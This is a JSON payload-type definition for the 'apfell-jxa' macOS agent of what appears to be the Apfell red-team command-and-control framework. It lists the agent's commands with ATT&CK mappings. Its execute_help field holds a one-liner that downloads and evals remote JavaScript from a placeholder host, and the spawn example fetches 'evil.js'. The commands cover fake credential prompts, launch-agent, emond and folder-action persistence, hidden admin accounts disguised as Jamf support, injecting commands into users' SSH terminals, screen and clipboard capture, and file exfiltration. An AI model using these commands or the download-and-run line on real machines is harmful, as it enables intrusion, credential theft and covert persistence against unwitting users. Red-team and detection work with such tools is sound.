{
"payload_types":[
  {
    "wrapper":false,
    "command_template":"exports.command_name = function(task, command, params){\n        \/\/task is a dictionary of Task information\n        \/\/command is the single word command that caused this function to be called\n        \/\/params is a string of everything passed in except for the command\n        \/\/   if you pass in a json blob on the command line, then to get json back here call JSON.parse(params);\n        \/\/do stuff here, with access to the following commands:\n        does_file_exist(strPath);\n        convert_to_nsdata(strData);\n        write_data_to_file(data, filePath);\n        base64_decode(data);\n        base64_encode(data);\n    };\n    COMMAND_ENDS_HERE\n    ",
    "supported_os":"macOS (x64)",
    "execute_help":"osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http:\/\/domain.com\/payload.file')),$.NSUTF8StringEncoding)));\"\n    ",
    "ptype":"apfell-jxa",
    "file_extension":".js",
    "wrapped_payload_type":"null",
    "external": false,
    "files":[],
    "c2_profiles":{},
    "load_transforms":[
      {
        "parameter":"",
        "name":"removeSlashes",
        "order":3
      },
      {
        "parameter":"",
        "name":"convertBytesToString",
        "order":2
      },
      {
        "parameter":"",
        "name":"combineCommands",
        "order":1
      }
    ],
    "create_transforms":[],
    "commands":[
    {
      "needs_admin":false,
      "help_cmd":"jscript {command}",
      "version":1,
      "description":"This runs the JavaScript command, {command}, and returns its output via an eval(). The output will get passed through ObjC.deepUnwrap to parse out basic data types from ObjectiveC and get strings back",
      "cmd":"jscript",
      "parameters":[],
      "attack":[
        {"t_num": "T1064", "attack_name": "Scripting"}
      ],
      "artifacts": []
    },
      {
        "needs_admin": false,
        "help_cmd": "persist_folderaction {\"folder\": \"/path/to/folder\", \"script_path\": \"/path/to/script/to/put/on/disk.scpt\", \"url\": \"http://url.of.hosted/payload\"}",
        "version": 1,
        "description": "Use Folder Actions to persist a compiled script on disk. You can either specify a 'URL' and automatically do a backgrounding one-liner, or supply your own code and language.",
        "cmd": "persist_folderaction",
        "parameters": [
          {
            "type": "String",
            "hint": "osascript code",
            "choices": "",
            "required": false,
            "name": "code"
          },
          {
            "type": "String",
            "hint": "http://url.of.hosted/payload",
            "choices": "",
            "required": false,
            "name": "url"
          },
          {
            "type": "String",
            "hint": "/path/to/folder/to/watch",
            "choices": "",
            "required": true,
            "name": "folder"
          },
          {
            "type": "String",
            "hint": "/path/to/script/to/create/on/disk",
            "choices": "",
            "required": true,
            "name": "script_path"
          },
          {
            "type": "Choice",
            "hint": "",
            "choices": "JavaScript\nAppleScript",
            "required": false,
            "name": "language"
          }
        ],
        "attack": [],
        "artifacts": []
      },
    {
      "needs_admin":false,
      "help_cmd":"From the GUI: shell_elevated for a prompt, or shell_elevated {\"command\":\"whoami\",\"prompt\":\"my fake prompt\", \"use_creds\": \"false\"}",
      "version":1,
      "description":"The command will use your prompt to pop a dialog box for the user asking for them to input their password so that the command you entered will be executed in an elevated context (prompt string is required in this case). Alternatively, you can supply a username and password and the command will run under their context (assuming they have the right permissions). From the UI, just type \"shell_elevated\" and you'll be prompted for the required parameters",
      "cmd":"shell_elevated",
      "parameters":[
      {
      "type":"String",
      "hint":"Command to execute",
      "choices":"",
      "required":true,
      "name":"command"
      },
      {
      "type":"Boolean",
      "hint":"",
      "choices":"",
      "required":true,
      "name":"use_creds"
      },
      {
      "type":"Credential",
      "hint":"Username that you want to run as",
      "choices":"",
      "required":false,
      "name":"user"
      },
      {
      "type":"Credential",
      "hint":"The user's password",
      "choices":"",
      "required":false,
      "name":"credential"
      },
      {
      "type":"String",
      "hint":"What prompt to display to the user when asking for permission",
      "choices":"",
      "required":false,
      "name":"prompt"
      }
      ],
      "attack":[
        {"t_num":"T1059","attack_name":"Command-Line Interface"},
        {"t_num":"T1141","attack_name": "Input Prompt"},
        {"t_num": "T1169", "attack_name": "Sudo"}
      ],
      "artifacts": [
        {"command_parameter":"command","artifact":"Process Create","artifact_string":"/usr/libexec/security_authtrampoline /System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid auth 15 /System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid /bin/sh -c *","replace_string":"*"},
        {"command_parameter":"command","artifact":"Process Create","artifact_string":"/System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid /System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid /bin/sh -c *","replace_string":"*"},
        {"command_parameter":"command","artifact":"Process Create","artifact_string":"/System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid /bin/sh -c *","replace_string":"*"},
        {"command_parameter":"command","artifact":"Process Create","artifact_string":"/bin/sh -c *","replace_string":"*"},
        {"command_parameter":"command","artifact":"Process Create","artifact_string":"*","replace_string":"*"}
      ]
    },
    {
      "needs_admin":false,
      "help_cmd":"From the GUI: proc_api. From the cmd-line: proc_api {\"path\":\"\/bin\/ps\",\"args\":[\"-ax\"]}",
      "version":1,
      "description":"The command uses the ObjectiveC bridge to spawn that process with those arguments on the computer and get your output back. It is not interactive and does not go through a shell.",
      "cmd":"proc_api",
      "parameters":[
      {
      "type":"String",
      "hint":"Full path to binary to execute",
      "choices":"",
      "required":true,
      "name":"path"
      },
      {
      "type":"Array",
      "hint":"",
      "choices":"",
      "required":false,
      "name":"args"
      }
      ],
      "attack":[
        {"t_num": "T1106", "attack_name": "Execution Through API"}
      ],
      "artifacts": [
        {"command_parameter":"path","artifact":"Process Create","artifact_string":"*","replace_string":"*"}
      ]
    },
    {
      "needs_admin":false,
      "help_cmd":"launchapp {bundle name}",
      "version":1,
      "description":"This uses the Objective C bridge to launch the specified app asynchronously and 'hidden' (it'll still show up in the dock for now). An example of the bundle name is 'com.apple.itunes' for launching iTunes.",
      "cmd":"launchapp",
      "parameters":[],
      "attack":[],
      "artifacts": [
        {"command_parameter":null,"artifact":"Process Create","artifact_string":"xpcproxy * (executed by launchd)","replace_string":"*"},
        {"command_parameter": null,"artifact": "Process Create","artifact_string": "bundle launched (executed by user)","replace_string": "*"}
      ]
    },
    {
      "needs_admin":false,
      "help_cmd":"clipboard [data]",
      "version":1,
      "description":"This will return the current clipboard contents on the target machine. If [data] is supplied, it will set the clipboard to [data].",
      "cmd":"clipboard",
      "parameters":[],
      "attack":[
        {"t_num": "T1115", "attack_name": "Clipboard Data"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"list_apps with optional {\"method\": api, \"verbose\": false}",
      "version":1,
      "description":"This uses JXA to list the currently running processes on the system and provides some information about them. To get a lot of information, use the [verbose] optional parameter.",
      "cmd":"list_apps",
      "parameters":[
      {
      "type":"Choice",
      "hint":"",
      "choices":"api\njxa",
      "required":false,
      "name":"method"
      },
      {
      "type":"Boolean",
      "hint":"",
      "choices":"",
      "required":false,
      "name":"verbose"
      }
      ],
      "attack":[
        {"t_num": "T1057", "attack_name": "Process Discovery"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"list_users: {\"method\": api, \"gid\": 0} or {\"groups\": true}",
      "version":1,
      "description":"This uses JXA to list the non-service user accounts on the system. Right now this defaults to \"api\". You can specify a GID to look at the users of a certain group or you can specify \"groups\" to be true and enumerate users by groups",
      "cmd":"list_users",
      "parameters":[
      {
      "type":"Choice",
      "hint":"",
      "choices":"api\njxa",
      "required":false,
      "name":"method"
      },
      {
      "type":"Number",
      "hint":"",
      "choices":"",
      "required":false,
      "name":"gid"
      },
      {
      "type":"Boolean",
      "hint":"",
      "choices":"",
      "required":false,
      "name":"groups"
      }
      ],
      "attack":[
        {"t_num": "T1087", "attack_name": "Account Discovery"},
        {"t_num": "T1069", "attack_name": "Permission Groups Discovery"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"current_user with optional {\"method\": \"api\"}",
      "version":1,
      "description":"This uses JXA to list information about the current user. In the future you can specify a [method] to do this via the ObjectiveC bridge or other methods. Right now this defaults to \"api\".",
      "cmd":"current_user",
      "parameters":[
      {
      "type":"Choice",
      "hint":"",
      "choices":"api\njxa",
      "required":false,
      "name":"method"
      }
      ],
      "attack":[
        {"t_num": "T1033", "attack_name": "System Owner/User Discovery"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"security_info {\"method\": api}",
      "version":1,
      "description":"This uses JXA to list some security information about the system. In the future you can specify a [method] to do this via the ObjectiveC bridge or other methods. Right now this defaults to \"jxa\".",
      "cmd":"security_info",
      "parameters":[
        {
        "type":"Choice",
        "hint":"",
        "choices":"jxa",
        "required":false,
        "name":"method"
      }
      ],
      "attack":[
        {"t_num": "T1201", "attack_name": "Password Policy Discovery"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"chrome_tabs",
      "version":1,
      "description":"This uses JXA to list information about all of the open tabs in all of the open Chrome instances. If Chrome is not currently running, this will launch Chrome (potential OPSEC issue) and might have a conflict with trying to access Chrome tabs as Chrome is starting. It's recommended to not use this unless Chrome is already running. Use the list_apps function to check if Chrome is running.\nIn Mojave this will cause a popup the first time asking for permission for your process to access Chrome.",
      "cmd":"chrome_tabs",
      "parameters":[],
      "attack":[
         {"t_num": "T1010", "attack_name": "Application Window Discovery"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"chrome_bookmarks",
      "version":1,
      "description":"This uses JXA to list information about all of the bookmarks in Chrome. If Chrome is not currently running, this will launch Chrome (potential OPSEC issue) and might have a conflict with trying to access Chrome's bookmarks as Chrome is starting. It's recommended to not use this unless Chrome is already running. Use the list_apps function to check if Chrome is running.\nIn Mojave this will cause a popup the first time asking for permission for your process to access Chrome.",
      "cmd":"chrome_bookmarks",
      "parameters":[],
      "attack":[
        {"t_num": "T1217", "attack_name": "Browser Bookmark Discovery"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"chrome_js {window ID number} {tab ID number} {JavaScript}",
      "version":1,
      "description":"This uses JXA to execute the specified JavaScript code into a specific browser tab. The chrome_tabs function will specify for each tab the window\/tab numbers that you can use for this function. Note: by default this ability is disabled in Chrome now, you will need to go to view->Developer->Allow JavaScript from Apple Events.",
      "cmd":"chrome_js",
      "parameters":[],
      "attack":[
        {"t_num": "T1064", "attack_name": "Scripting"},
        {"t_num": "T1106", "attack_name": "Execution Through API"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"system_info {\"method\": \"jxa\"}",
      "version":1,
      "description":"This uses JXA to get some system information. In the future you can specify a [method] to do this via the ObjectiveC bridge or other methods. Right now this defaults to \"jxa\"",
      "cmd":"system_info",
      "parameters":[
        {
        "type":"Choice",
        "hint":"",
        "choices":"jxa",
        "required":false,
        "name":"method"
      }
      ],
      "attack":[
        {"t_num": "T1082", "attack_name": "System Information Discovery"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"terminals_read [history] [contents]",
      "version":1,
      "description":"This uses JXA to read information about open instances of Apple's Terminal.app. The contents flag allows you to see exactly what the user can see at that moment on the screen. The history flag allows you to see everything that's in that tab's scroll history. This can be a lot of information, so keep that in mind. This function will also give you the window\/tab information for each open session and a bunch of other information.\nEx: terminals_read history",
      "cmd":"terminals_read",
      "parameters":[],
      "attack":[
        {"t_num": "T1056", "attack_name": "Input Capture"},
        {"t_num": "T1139", "attack_name": "Bash History"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"terminals_send {window ID number} {tab ID number} {command}",
      "version":1,
      "description":"This uses JXA to inject the shell command, {command}, into the specified terminal shell as if the user typed it from the keyboard. This is pretty powerful. Consider the instance where the user is SSH-ed into another machine via terminal - with this you can inject commands to run on the remote host. Just remember, the user will be able to see the command, but you can always see what they see as well with the \"terminals_read contents\" command.",
      "cmd":"terminals_send",
      "parameters":[],
      "attack":[
        {"t_num": "T1059", "attack_name": "Command-Line Interface"},
        {"t_num": "T1184", "attack_name": "SSH Hijacking"}
      ],
      "artifacts": [
        {"command_parameter":null,"artifact":"Process Create","artifact_string":"*","replace_string":"*"}
      ]
    },
    {
      "needs_admin":false,
      "help_cmd":"spawn {\"method\":\"shell_api\",\"type\":\"oneliner\",\"payload-type\":\"apfell-jxa\", \"url\":\"https://mydomain.com/evil.js\"}",
      "version":1,
      "description":"This pulls down the payload specified by {url} and uses the shell_api to execute it in a background process. !!!! Right now this requires the \"shell_api\" command to also be loaded!!! It will run the oneliner as a background task",
      "cmd":"spawn",
      "parameters":[
        {
          "type":"Choice",
          "hint":"",
          "choices":"shell_api",
          "required":true,
          "name":"method"
        },
        {
          "type":"Choice",
          "hint":"",
          "choices":"oneliner",
          "required":true,
          "name":"type"
        },
        {
          "type":"Choice",
          "hint":"",
          "choices":"apfell-jxa",
          "required":true,
          "name":"payload-type"
        },
        {
          "type":"String",
          "hint":"http:\/\/domain.com\/payload.js",
          "choices":"",
          "required":true,
          "name":"url"
        }
      ],
      "attack":[
        {"t_num": "T1059", "attack_name": "Command-Line Interface"},
        {"t_num":"T1155","attack_name":"AppleScript"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"download {path to remote file}",
      "version":1,
      "description":"Download a file from the victim machine to the apfell server in chunks (no need for quotes in the path). It will be saved to app\/files\/{operation name}\/downloads\/{hostname}\/{filename}",
      "cmd":"download",
      "parameters":[],
      "attack":[
        {"t_num": "T1030", "attack_name": "Data Transfer Size Limits"},
        {"t_num": "T1041", "attack_name": "Exfiltration Over Command and Control Channel"},
        {"t_num": "T1020", "attack_name": "Automated Exfiltration"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"sleep {integer interval}",
      "version":1,
      "description":"Modify the time between callbacks in seconds.",
      "cmd":"sleep",
      "parameters":[],
      "attack":[
        {"t_num": "T1029", "attack_name": "Scheduled Transfer"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"exit",
      "version":1,
      "description":"This exits the current apfell-jxa instance by leveraging the ObjectiveC bridge's NSApplication terminate function.",
      "cmd":"exit",
      "parameters":[],
      "attack":[],
      "artifacts": [],
      "is_exit": true
    },
    {
    "needs_admin":false,
    "help_cmd":"shell {command}",
    "version":1,
    "description":"This runs {command} in a terminal by leveraging JXA's Application.doShellScript({command})",
    "cmd":"shell",
    "parameters":[],
    "attack":[
      {"t_num":"T1059","attack_name":"Command-Line Interface"}
    ],
      "artifacts": [
        {"command_parameter":null,"artifact":"Process Create","artifact_string":"sh -c *","replace_string":"*"}
      ]
    },
    {
    "needs_admin":false,
    "help_cmd":"load cmd1, cmd2, cmd3",
    "version":1,
    "description":"This loads a new function into memory via the C2 channel to be used by the operator. The code will be base64 encoded when requested. This will get transformed into load {\"cmds\": \"cmd1, cmd2, cmd3\", \"file_id\": #}",
    "cmd":"load",
    "parameters":[],
    "attack":[
      {"t_num":"T1129","attack_name":"Execution through Module Load"},
      {"t_num": "T1030", "attack_name": "Data Transfer Size Limits"}
    ],
    "artifacts": []
    },
    {
    "needs_admin":false,
    "help_cmd":"get_config",
    "version":1,
    "description":"Gets the current running config via the C2 class",
    "cmd":"get_config",
    "parameters":[],
    "attack":[
        {"t_num":"T1082","attack_name":"System Information Discovery"}
    ],
    "artifacts": []
    },
    {
    "needs_admin":false,
    "help_cmd":"screencapture",
    "version":1,
    "description":"Use the built-in CGDisplay API calls to capture the display and send it back over the C2 channel",
    "cmd":"screencapture",
    "parameters":[],
    "attack":[
      {"t_num":"T1113","attack_name":"Screen Capture"}
    ],
    "artifacts": []
    },
    {
    "needs_admin":false,
    "help_cmd":"read one file: plist {\"type\": \"read\", \"filename\": \"full_path\"}, read all plists of a certain type: plist {\"type\": [\"readLaunchAgents\" | \"readLaunchDaemons\"]}",
    "version":1,
    "description":"Read plists and their associated attributes for attempts to privilege escalate",
    "cmd":"plist",
    "parameters":[
      {
        "type":"Choice",
        "hint":"",
        "choices":"readLaunchAgents\nreadLaunchDaemons\nread",
        "required":true,
        "name":"type"
      },
      {
        "type":"String",
        "hint":"full filename path if type is just read",
        "choices":"",
        "required":false,
        "name":"filename"
      }
    ],
    "attack":[
      {"t_num":"T1083","attack_name":"File and Directory Discovery"},
      {"t_num":"T1007","attack_name":"System Service Discovery"}
    ],
    "artifacts": []
    },
    {
    "needs_admin":false,
    "help_cmd":"cat \/path\/to\/file",
    "version":1,
    "description":"Read the contents of a file and display it to the user. No need for quotes and relative paths are fine",
    "cmd":"cat",
    "parameters":[],
    "attack":[
      {"t_num":"T1106","attack_name":"Execution through API"},
      {"t_num": "T1081", "attack_name": "Credentials in Files"}
    ],
    "artifacts": []
    },
    {
    "needs_admin":false,
    "help_cmd":"ls \/path\/to\/file",
    "version":1,
    "description":"Get attributes about a file and display it to the user via API calls. No need for quotes and relative paths are fine",
    "cmd":"ls",
    "parameters":[],
    "attack":[
      {"t_num":"T1106","attack_name":"Execution through API"},
      {"t_num":"T1083","attack_name":"File and Directory Discovery"}
    ],
    "artifacts": []
    },
    {
    "needs_admin":false,
    "help_cmd":"test_password with no args uses blank password and current user. or, test_password {\"username\": \"bob\", \"password\": \"bob\"}",
    "version":1,
    "description":"Tests a password against a user to see if it's valid via an API call",
    "cmd":"test_password",
    "parameters":[
      {
        "type":"Credential",
        "hint":"",
        "choices":"",
        "required":false,
        "name":"username"
      },
      {
        "type":"Credential",
        "hint":"",
        "choices":"",
        "required":false,
        "name":"password"
      }
    ],
    "attack":[
      {"t_num": "T1110", "attack_name": "Brute Force"}
    ],
    "artifacts": []
    },
    {
    "needs_admin":false,
    "help_cmd":"jsimport {\"url\": \"https:\/\/domain.com\/file\/to\/import\"} or jsimport {\"file_id\": 5}",
    "version":1,
    "description":"import a JS file into memory from a remote address. Only one can be imported at a time. You can upload a file on Services -> Host Files to get a file_id back to use",
    "cmd":"jsimport",
    "parameters":[
      {
        "type":"String",
        "hint":"URL to the file",
        "choices":"",
        "required":false,
        "name":"url"
      },
      {
        "type":"Number",
        "hint":"",
        "choices":"",
        "required":false,
        "name":"file_id"
      }
    ],
    "attack":[],
    "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"jsimport_call Get_DomainUser({help=true});",
      "version":1,
      "description":"call a function from within the JS file that was imported with \"jsimport\". This function call is appended to the end of the jsimport code and called via eval.",
      "cmd":"jsimport_call",
      "parameters":[],
      "attack":[
        {"t_num":"T1155","attack_name":"AppleScript"},
        {"t_num":"T1064","attack_name":"Scripting"}
      ],
      "artifacts": []
    },
    {
    "needs_admin":false,
    "help_cmd":"prompt with optional title, icon, text, default answer",
    "version":1,
    "description":"Create a custom prompt to ask the user for credentials",
    "cmd":"prompt",
    "parameters":[
      {
        "type":"String",
        "hint":"Title of the dialog box",
        "choices":"",
        "required":false,
        "name":"title"
      },
      {
        "type":"String",
        "hint":"full path to .icns file to use",
        "choices":"",
        "required":false,
        "name":"icon"
      },
      {
        "type":"String",
        "hint":"Additional descriptive text to display",
        "choices":"",
        "required":false,
        "name":"text"
      },
      {
        "type":"String",
        "hint":"Default answer to pre-populate (will show up as *****)",
        "choices":"",
        "required":false,
        "name":"answer"
      }
    ],
    "attack":[
      {"t_num":"T1141","attack_name":"Input Prompt"}
    ],
    "artifacts": [
      {"command_parameter":null,"artifact":"Process Create","artifact_string":"CVMServer wrote file /private/var/db/CVMS/cvmsCodeSignObj[somes_string]","replace_string":"*"},
      {"command_parameter":null,"artifact":"Process Create","artifact_string":"osascript loaded dylib /private/var/db/CVMS/cvmsCodeSignObj[somes_string]","replace_string":"*"}
      ]
    },
    {
      "needs_admin":true,
      "help_cmd":"add_user",
      "version":1,
      "description":"add a local user to the system by wrapping the Apple binary, dscl.",
      "cmd":"add_user",
      "parameters":[
        {
          "type":"Boolean",
          "hint":"",
          "choices":"",
          "required":false,
          "name":"admin"
        },
        {
          "type":"Boolean",
          "hint":"",
          "choices":"",
          "required":false,
          "name":"hidden"
        },
        {
          "type":"String",
          "hint":".jamf_support",
          "choices":"",
          "required":false,
          "name":"username"
        },
        {
          "type":"String",
          "hint":"P@55w0rd_here",
          "choices":"",
          "required":false,
          "name":"password"
        },
        {
          "type":"String",
          "hint":"Jamf Support User",
          "choices":"",
          "required":false,
          "name":"realname"
        },
        {
          "type":"String",
          "hint":"\/Users\/.jamf_support",
          "choices":"",
          "required":false,
          "name":"homedir"
        },
        {
          "type":"Number",
          "hint":"",
          "choices":"",
          "required":false,
          "name":"uniqueid"
        },
        {
          "type":"Number",
          "hint":"",
          "choices":"",
          "required":false,
          "name":"primarygroupid"
        },
        {
          "type":"String",
          "hint":"\/bin\/bash",
          "choices":"",
          "required":false,
          "name":"usershell"
        },
        {
          "type":"Boolean",
          "hint":"",
          "choices":"",
          "required":false,
          "name":"createprofile"
        },
        {
          "type":"String",
          "hint":"username that will execute the commands",
          "choices":"",
          "required":true,
          "name":"user"
        },
        {
          "type":"String",
          "hint":"password of the user that will execute the commands",
          "choices":"",
          "required":true,
          "name":"passwd"
        }
      ],
      "attack":[
        {"t_num":"T1136","attack_name":"Create Account"},
        {"t_num": "T1169", "attack_name": "Sudo"}
      ],
      "artifacts": [

      ]
    },
    {
      "needs_admin":false,
      "help_cmd":"persist_launch",
      "version":1,
      "description":"Create a launch agent or daemon plist file and either automatically put it in ~\/Library\/LaunchAgents or if LocalAgent is false, save it to the specified location. If you want an elevated launch agent or launch daemon( \/Library\/LaunchAgents or \/Library\/LaunchDaemons), you either need to be in an elevated context already and specify the path or use something like shell_elevated to copy it there.\nIf the first arg is 'apfell-jxa' then I'll automatically construct a plist appropriate oneliner to use where arg1 should be the URL to reach out to for the payload.",
      "cmd":"persist_launch",
      "parameters":[
      {
        "type":"Array",
        "hint":"",
        "choices":"",
        "required":true,
        "name":"args"
      },
      {
        "type":"Boolean",
        "hint":"",
        "choices":"",
        "required":false,
        "name":"KeepAlive"
      },
      {
        "type":"String",
        "hint":"com.apple.softwareupdateagent",
        "choices":"",
        "required":true,
        "name":"label"
      },
      {
        "type":"String",
        "hint":"Path to save new plist to if LocalAgent is false",
        "choices":"",
        "required":false,
        "name":"LaunchPath"
      },
      {
        "type":"Boolean",
        "hint":"",
        "choices":"",
        "required":false,
        "name":"LocalAgent"
      },
      {
        "type":"Boolean",
        "hint":"",
        "choices":"",
        "required":false,
        "name":"RunAtLoad"
      }
      ],
      "attack":[
        {"t_num": "T1159", "attack_name": "Launch Agent"},
        {"t_num": "T1160", "attack_name": "Launch Daemon"}
      ],
      "artifacts": [
        {"command_parameter":"LaunchPath","artifact":"File Create","artifact_string":"Potentially created \"*\" if we didn't create a launch agent file.", "replace_string":"*"},
        {"command_parameter":"LocalAgent","artifact":"File Create","artifact_string":"Created a ~/Library/LaunchAgent file: *","replace_string":"*"}
      ]
    },
    {
      "needs_admin":true,
      "help_cmd":"persist_emond",
      "version":1,
      "description":"Create persistence with an emond plist file in \/etc\/emond.d\/rules\/ and a .DS_Store file to trigger it","cmd":"persist_emond",
      "parameters":[
      {
        "type":"String",
        "hint":"Rule name for inside of the plist",
        "choices":"",
        "required":true,
        "name":"rule_name"
      },
      {
        "type":"Choice",
        "hint":"",
        "choices":"oneliner-jxa\ncustom_bash-c",
        "required":true,
        "name":"payload_type"
      },
      {
        "type":"String",
        "hint":"url of payload for oneliner-jxa",
        "choices":"",
        "required":false,
        "name":"url"
      },
      {
        "type":"String",
        "hint":"Command if type is custom_bash-c",
        "choices":"",
        "required":false,
        "name":"command"
      },
      {
        "type":"String",
        "hint":"Name of plist in \/etc\/emond.d\/rules\/",
        "choices":"",
        "required":true,
        "name":"file_name"
      }
      ],
      "attack":[
        {"t_num": "T1150", "attack_name": "Plist Modification"}
      ],
      "artifacts": [
      ]
    },
    {
      "needs_admin":false,
      "help_cmd":"swap_c2 {\"profile\": file_number}, or just swap_c2",
      "version":1,
      "description":"Swap out the running c2 configuration in the apfell-jxa agent with another that was generated with Create Components -> Instantiate C2 Profile",
      "cmd":"swap_c2",
      "parameters":[
      {
        "type":"Number",
        "hint":"",
        "choices":"",
        "required":true,
        "name":"profile"
      }
      ],
      "attack":[
        {"t_num": "T1026", "attack_name": "Multiband Communication"},
        {"t_num": "T1008", "attack_name": "Fallback Channels"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"pwd",
      "version":1,
      "description":"Prints the current working directory for the agent",
      "cmd":"pwd",
      "parameters":[],
      "attack":[
        {"t_num": "T1083", "attack_name": "File and Directory Discovery"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"cd {path}",
      "version":1,
      "description":"Change the current working directory to another directory. No quotes are necessary and relative paths are fine",
      "cmd":"cd",
      "parameters":[],
      "attack":[
        {"t_num": "T1083", "attack_name": "File and Directory Discovery"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"rm {file path}",
      "version":1,
      "description":"Remove a file, no quotes are necessary and relative paths are fine",
      "cmd":"rm",
      "parameters":[],
      "attack":[
        {"t_num": "T1106", "attack_name": "Execution through API"},
        {"t_num": "T1107", "attack_name": "File Deletion"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"iTerm",
      "version":1,
      "description":"Read the contents of all open iTerm tabs if iTerms is open, otherwise just inform the operator that it's not currently running",
      "cmd":"iTerm",
      "parameters":[],
      "attack":[
        {"t_num": "T1056", "attack_name": "Input Capture"},
        {"t_num": "T1139", "attack_name": "Bash History"}
      ],
      "artifacts": []
    },
    {
      "needs_admin":false,
      "help_cmd":"upload {\"remote_path\": \"\/users\/itsafeature\/Desktop\/tes.png\", \"file_id\": 65}",
      "version":1,
      "description":"Take a file from the database and store it on disk through the callback.",
      "cmd":"upload",
      "parameters":[
        {
        "type":"Number",
        "hint":"",
        "choices":"",
        "required":false,
        "name":"file_id"
        },
        {
        "type":"File",
        "hint":"",
        "choices":"",
        "required":false,
        "name":"file"
        },
        {
        "type":"String",
        "hint":"\/remote\/path\/on\/victim.txt",
        "choices":"",
        "required":true,
        "name":"remote_path"
        }
      ],
      "attack":[
        {"t_num": "T1105", "attack_name": "Remote File Copy"},
        {"t_num": "T1132", "attack_name": "Data Encoding"},
        {"t_num": "T1030", "attack_name": "Data Transfer Size Limits"}
      ],
      "artifacts": [
         {"command_parameter":"remote_path","artifact":"File Create","artifact_string":"*","replace_string":"*"}
      ]
    }
    ]
    }
  ]
}